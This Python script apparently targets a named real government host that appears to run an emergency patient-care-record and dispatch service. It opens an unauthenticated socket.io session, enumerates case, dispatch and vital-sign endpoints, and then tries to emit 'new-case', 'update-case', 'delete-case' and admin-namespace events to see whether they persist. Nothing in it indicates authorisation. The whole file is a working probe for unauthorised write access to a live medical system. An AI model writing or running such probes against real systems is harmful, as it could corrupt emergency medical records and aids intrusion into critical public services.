#!/usr/bin/env python3
"""
Test if 4002 socket.io business events actually persist anything.

Pattern: copy from 3800 successful enumeration.
- HTTPS protocol mandatory
- Origin header mandatory
- Skip drain polling GET
- Direct POST business events with sid
"""
import requests, urllib3, json, re, time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
BASE = "https://epcr.tpf.gov.tw:4002"

HEADERS = {
    "Origin": "https://epcr.tpf.gov.tw:4002",
    "Referer": "https://epcr.tpf.gov.tw:4002/",
    "User-Agent": "Mozilla/5.0",
}


def open_sio(s):
    r = s.get(f"{BASE}/socket.io/?EIO=4&transport=polling", headers=HEADERS, timeout=10)
    print(f"[open] status={r.status_code} len={len(r.text)} cookies={dict(s.cookies)}")
    m = re.search(r'"sid":"([^"]+)"', r.text)
    return m.group(1) if m else None


def send_emit(s, sid, ns, event, args):
    """Send 42<data> event. Skip drain GET."""
    body_chunks = []
    if ns:
        body_chunks.append(f"{len('40' + ns)}:40{ns}")
    args = args if isinstance(args, list) else [args]
    payload = json.dumps([event] + args, ensure_ascii=False, separators=(',', ':'))
    msg = f"42{ns}{payload}"
    body_chunks.append(f"{len(msg)}:{msg}")
    body = "".join(body_chunks)
    try:
        r = s.post(f"{BASE}/socket.io/?EIO=4&transport=polling&sid={sid}",
                   data=body, headers={**HEADERS, "Content-Type": "text/plain;charset=UTF-8"},
                   timeout=8)
        return r.status_code, r.text[:200]
    except Exception as e:
        return -1, f"ERR: {e}"


def main():
    s = requests.Session()
    sid = open_sio(s)
    if not sid:
        print("[!] failed to open SIO")
        return

    # Get baseline counts
    print("\n[*] Baseline: 4002 REST counts")
    try:
        # 4002 requires JWT for most REST endpoints but try no-auth ones
        r = s.get(f"{BASE}/config", headers=HEADERS, timeout=5)
        print(f"  /config: {r.status_code} {len(r.text)}")
        for ep in ['/Pcrs', '/Dispatches', '/Cases', '/VitalSignSets', '/MciTypes', '/PcrBundles']:
            try:
                r2 = s.get(f"{BASE}{ep}", headers=HEADERS, timeout=3)
                print(f"  {ep}: {r2.status_code} {len(r2.text)}")
            except Exception as e:
                print(f"  {ep}: ERR {e}")
    except Exception as e:
        print(f"  ERR: {e}")

    # Try emit events
    print("\n===== Step A: Default namespace events =====")
    events_default = [
        ("client.subscribe", {"roomName": "caseList_TEST"}),
        ("client.unsubscribe", {"roomName": "caseList_TEST"}),
        ("subscribe", {"room": "admin"}),
        ("unsubscribe", {"room": "admin"}),
        ("join", {"room": "caseList"}),
        ("leave", {"room": "caseList"}),
        ("hello", {"u": "test"}),
        ("ready", {}),
        ("ping", {}),
        ("pong", {}),
        ("new-case", {"CaseID": "TEST"}),
        ("update-case", {"id": "TEST"}),
        ("delete-case", {"id": "TEST"}),
        ("dispatch", {"id": "TEST"}),
        ("vitalSign", {"CaseID": "TEST"}),
    ]
    for ev, payload in events_default:
        st, txt = send_emit(s, sid, "", ev, payload)
        print(f"  emit({ev}): status={st} resp='{txt[:80]}'")
        time.sleep(0.2)

    print("\n===== Step B: Protected namespace events =====")
    for ns in ["/admin", "/mci", "/case", "/dispatch"]:
        for ev in ["hello", "ready", "auth", "ping", "subscribe"]:
            st, txt = send_emit(s, sid, ns, ev, {"test": "data"})
            print(f"  emit({ev}) ns={ns}: status={st} resp='{txt[:80]}'")
            time.sleep(0.2)


if __name__ == "__main__":
    main()